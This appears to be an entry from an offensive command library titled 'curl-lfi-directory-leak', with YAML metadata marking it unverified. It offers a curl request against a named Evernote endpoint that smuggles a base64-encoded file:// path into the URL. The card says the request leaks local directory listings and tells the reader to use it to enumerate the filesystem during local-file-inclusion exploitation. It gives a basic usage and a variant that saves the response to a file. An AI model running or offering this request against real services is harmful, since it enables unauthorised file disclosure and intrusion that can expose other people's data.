---
data: >-
  curl
  "https://www.evernote.com/ro/ZmlsZTovLy9ob21lL2FiZW5hdmlkZXMvIy5qcw==/-1430533899.js"
tags:
  - lfi
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:29.999Z'
id: 9f985d52-50fe-437a-b86d-6bfb8d313748
verified: false
validated: true
submitted: true
---
# curl-lfi-directory-leak

## Command

```bash
curl "https://www.evernote.com/ro/ZmlsZTovLy9ob21lL2FiZW5hdmlkZXMvIy5qcw==/-1430533899.js"
```

## Description

Sends an HTTP GET request to the vulnerable Evernote endpoint with a base64-encoded file:// URI to leak local directory contents. Use this to enumerate filesystem structure during LFI exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Full endpoint with encoded path | Yes |
| -s | Silent mode (optional) | No |

## Examples

### Basic Usage

```bash
curl "https://www.evernote.com/ro/ZmlsZTovLy9ob21lL2FiZW5hdmlkZXMvIy5qcw==/-1430533899.js"
```

### Advanced Usage

```bash
curl -s -o output.txt "https://www.evernote.com/ro/ZmlsZTovLy9ob21lL2FiZW5hdmlkZXMvIy5qcw==/-1430533899.js"
```

## Expected Output

HTTP response body containing directory listing, e.g., file names and sizes rendered as text.

## Related

- [[Related Procedure]]
